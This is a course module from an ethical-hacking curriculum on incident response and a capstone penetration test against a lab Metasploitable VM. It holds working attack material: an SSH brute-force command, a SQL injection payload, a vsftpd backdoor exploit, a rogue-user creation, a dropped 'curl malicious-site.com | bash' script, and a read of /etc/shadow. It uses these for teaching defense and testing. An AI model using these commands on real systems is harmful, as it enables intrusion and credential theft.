# Module 5: Incident Response, Defense & Capstone Assessment

**Atiam College - Cyber Security & Ethical Hacking**
**Module:** 5 of 5 — Think Like a Defender, Then Prove Everything You Learned
**Duration:** 3–4 Hours (+ report writing time)
**Difficulty:** Intermediate–Advanced

---

## What You Will Do in This Module

1. **Part A — Incident Response:** Investigate a compromised Metasploitable system using logs and forensic commands.
2. **Part B — Capstone Penetration Test:** Run the full attack cycle independently and write a professional report.

Cyber security is **offense and defense**. You have learned to attack; now you learn to **detect and document** what attackers leave behind, then deliver a final assessment.

---

## Objectives

By the end of this module, you will be able to:

- Analyze `auth.log` and Apache logs for attack evidence
- Identify rogue users, suspicious files, and active attacker connections
- Build a chronological incident timeline
- Execute a full penetration test cycle on Metasploitable
- Write a structured penetration test report with remediation advice

---

## Prerequisites

- **Completed Modules 1–4**
- Kali + Metasploitable on Host-Only network
- Your notes from previous modules in `~/cyber-labs/`

---

## Setup

```bash
export TARGET=192.168.56.101
ping -c 2 $TARGET
```

Use your real Metasploitable IP everywhere you see `192.168.56.101`.

---

# Part A: Incident Response & Forensics

We will **simulate an attack**, then **investigate** it like a blue-team analyst.

---

## Step A.1 — Simulate a Brute Force Attack (From Kali)

```bash
hydra -l root -P /usr/share/wordlists/metasploit/common_passwords.txt ssh://$TARGET -t 4 -V
```

Let it run **10–15 seconds**, then press `Ctrl+C`.

**What this simulates:** An attacker trying many passwords against SSH.

**What it creates:** Failed login entries in Metasploitable's auth logs.

---

## Step A.2 — Simulate a Web Attack (From Kali Browser)

1. Open Firefox → `http://$TARGET/dvwa/`
2. Log in: `admin` / `password`
3. Go to **SQL Injection**
4. Submit this in User ID:

```
1' UNION SELECT user, password FROM users -- -
```

**What this creates:** Suspicious entries in Apache access logs.

---

## Step A.3 — Simulate Post-Exploitation (From Kali)

```bash
msfconsole -q
```

```
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
run
```

Once you have a root shell on Metasploitable:

```bash
useradd -m -s /bin/bash backupadmin
echo "backupadmin:P@ssw0rd123" | chpasswd
echo "curl -s http://malicious-site.com/malware | bash" > /tmp/update.sh
chmod +x /tmp/update.sh
exit
```

```
exit
```

**What this simulates:** Attacker creates a hidden user and drops a malicious script.

---

## Step A.4 — Investigate: Successful and Failed Logins

**SSH into Metasploitable** as `msfadmin` / `msfadmin` (or use the VM console).

**Last successful logins:**

```bash
last -n 10
```

**Failed login attempts:**

```bash
lastb -n 20
```

**Expected:** Many failed attempts for `root` from your Kali IP — sign of brute force.

---

## Step A.5 — Investigate: Authentication Log

```bash
sudo grep "Failed password" /var/log/auth.log | head -20
```

**Expected:** Lines matching your Hydra attack.

**Count attempts per IP:**

```bash
sudo grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr
```

| Command Part | What It Does |
|--------------|-------------|
| `grep "Failed password"` | Filter failed logins |
| `awk '{print $(NF-3)}'` | Extract IP address field |
| `sort \| uniq -c` | Count occurrences per IP |
| `sort -nr` | Highest count first |

**Expected:** Your Kali IP at the top with the highest count.

---

## Step A.6 — Investigate: Web Server Logs

```bash
sudo tail -n 30 /var/log/apache2/access.log
```

A log line looks like:

```
192.168.56.100 - - [DATE] "GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT... HTTP/1.1" 200 ...
```

| Part | Meaning |
|------|---------|
| First field | Attacker IP |
| Quoted section | HTTP request (URL-encoded: `%27` = `'`) |
| `200` | Server responded successfully |

**Search for SQL injection patterns:**

```bash
sudo grep -i "union\|select" /var/log/apache2/access.log
```

**Search for XSS patterns:**

```bash
sudo grep -i "script\|alert" /var/log/apache2/access.log
```

---

## Step A.7 — Investigate: Rogue Files and Users

**Recently modified files in /tmp:**

```bash
find /tmp -mmin -120 -type f 2>/dev/null
```

**Expected:** `/tmp/update.sh` from Step A.3.

**Read the suspicious file:**

```bash
cat /tmp/update.sh
```

**Check for unauthorized users:**

```bash
tail -n 5 /etc/passwd
```

**Expected:** `backupadmin` user you created.

**Users with root privileges (UID 0):**

```bash
awk -F: '($3 == 0) {print $1}' /etc/passwd
```

**Expected:** Only `root` — if `backupadmin` had UID 0, that would be critical.

---

## Step A.8 — Investigate: Active Connections

```bash
sudo netstat -nap | grep ESTABLISHED
```

Or:

```bash
sudo ss -ap | grep ESTAB
```

Look for unusual ports (e.g. `6200` from vsftpd backdoor, `4444` common for shells).

---

## Step A.9 — Write the Incident Timeline

On **Kali**:

```bash
nano ~/cyber-labs/incident-timeline.md
```

Use this structure and **fill in real times and IPs** from your investigation:

```markdown
# Security Incident Report

## Overview
- System: Metasploitable 2 ([TARGET IP])
- Investigator: [Your Name]
- Date: [Today]

## Timeline

| Time (approx) | Source IP | Event | Evidence |
|---------------|-----------|-------|----------|
| | Kali IP | SSH brute force started | auth.log "Failed password" |
| | Kali IP | SQL injection on DVWA | access.log UNION SELECT |
| | Kali IP | vsftpd exploitation | Connection on port 21/6200 |
| | | Rogue user backupadmin created | /etc/passwd |
| | | Malicious script dropped | /tmp/update.sh |

## Indicators of Compromise (IoCs)
- Attacker IP:
- Rogue accounts:
- Malicious files:
- Suspicious ports:

## Remediation Plan
1. Delete rogue user: userdel -r backupadmin
2. Remove /tmp/update.sh
3. Patch/replace vsftpd
4. Fix DVWA SQL injection (parameterized queries)
5. Enable fail2ban on SSH
6. Forward logs to central SIEM
```

---

## Step A.10 — Remediate the Incident

On Metasploitable:

```bash
sudo userdel -r backupadmin
sudo rm -f /tmp/update.sh
```

Optionally restore from VMware snapshot for a fully clean system.

---

# Part B: Capstone — Full Penetration Test

You are a consultant hired by **Atiam Corp** to test their server (Metasploitable 2).

---

## The Engagement Rules

| Rule | Detail |
|------|--------|
| **Scope** | One IP — your Metasploitable VM only |
| **Goal** | Find weaknesses, exploit to prove risk, write report |
| **Allowed** | Scanning, web testing, exploitation, priv esc |
| **Forbidden** | DoS attacks, testing anything outside Host-Only lab |

---

## Step B.1 — Phase 1: Reconnaissance

Document in your report:

- Lab network setup (Host-Only, subnet, Kali IP, target IP)
- Rules of engagement you followed
- Any passive OSINT you performed (from Module 3)

---

## Step B.2 — Phase 2: Scanning & Enumeration

Run and **save output**:

```bash
sudo nmap -sS -sV -O --open $TARGET -oA ~/cyber-labs/capstone-scan
enum4linux -a $TARGET 2>&1 | tee ~/cyber-labs/capstone-enum.txt
```

Record: all open ports, versions, users, shares.

---

## Step B.3 — Phase 3: Vulnerability Analysis

```bash
nmap --script vuln $TARGET 2>&1 | tee ~/cyber-labs/capstone-vuln.txt
nikto -h http://$TARGET -o ~/cyber-labs/capstone-nikto.txt -Format txt
```

Identify **at least 3 vulnerabilities** with High or Critical severity. Use `searchsploit` to confirm public exploits exist.

---

## Step B.4 — Phase 4: Exploitation (Minimum 2 Successful Compromises)

You must demonstrate:

1. **One network exploit** — e.g. vsftpd backdoor or Samba usermap
2. **One web exploit** — e.g. SQL Injection extracting credentials from DVWA

**For each exploit, capture:**

- Exact commands used
- Terminal output showing success
- Proof (`whoami`, `id`, or database dump)

---

## Step B.5 — Phase 5: Post-Exploitation

After gaining access:

```bash
whoami
id
cat /etc/shadow
```

Document one privilege escalation path (e.g. SUID nmap, or note you already have root from vsftpd).

---

## Step B.6 — Write the Penetration Test Report

Create on Kali:

```bash
nano ~/cyber-labs/penetration-test-report.md
```

**Required sections:**

### 1. Executive Summary
- Overall security posture (1 paragraph for managers)
- Most critical finding
- Top 3 recommendations

### 2. Scope & Methodology
- Target IP, dates, tools used
- Testing approach (recon → scan → vuln → exploit → post)

### 3. Findings Table

| ID | Finding | Severity | Port/Service | Impact |
|----|---------|----------|--------------|--------|
| 01 | | Critical/High/Medium | | |
| 02 | | | | |
| 03 | | | | |

### 4. Detailed Findings (at least 3)

For each finding include:

- Description
- Step-by-step exploitation (commands + output)
- Proof of compromise
- Remediation steps

### 5. Recommendations Roadmap

| Timeframe | Actions |
|-----------|---------|
| **48 hours** | Patch critical services, remove default creds |
| **30 days** | Harden SSH, web apps, SMB |
| **90 days** | Regular scanning, logging/SIEM, staff training |

---

## Step B.7 — Clean Up and Submit

1. Remove any backdoor users or files you created
2. Restore Metasploitable from VMware snapshot
3. Submit `penetration-test-report.md` (or PDF export) to your instructor

---

## Graduation Skills Checklist

You should now be able to:

- [ ] Analyze network traffic and configure basic firewalls (Module 1)
- [ ] Build and secure a hacking lab (Module 2)
- [ ] Perform recon, scanning, and vulnerability assessment (Module 3)
- [ ] Exploit network and web vulnerabilities (Module 4)
- [ ] Investigate incidents and write professional reports (Module 5)

---

## Summary & Outcomes

| Skill | Status |
|-------|--------|
| Log analysis (auth, Apache) | Yes |
| Incident timeline and IoC documentation | Yes |
| Full penetration test cycle | Yes |
| Professional report writing | Yes |

---

## Reflection Questions

1. If an attacker clears `/var/log/auth.log`, how can defenders still investigate?
2. What is the difference between an IoC and an IoA?
3. Why do companies pay for the **report**, not just the hack?
4. Why must incident responders preserve system state instead of immediately rebooting?
5. How would you explain your most critical finding to a non-technical manager?
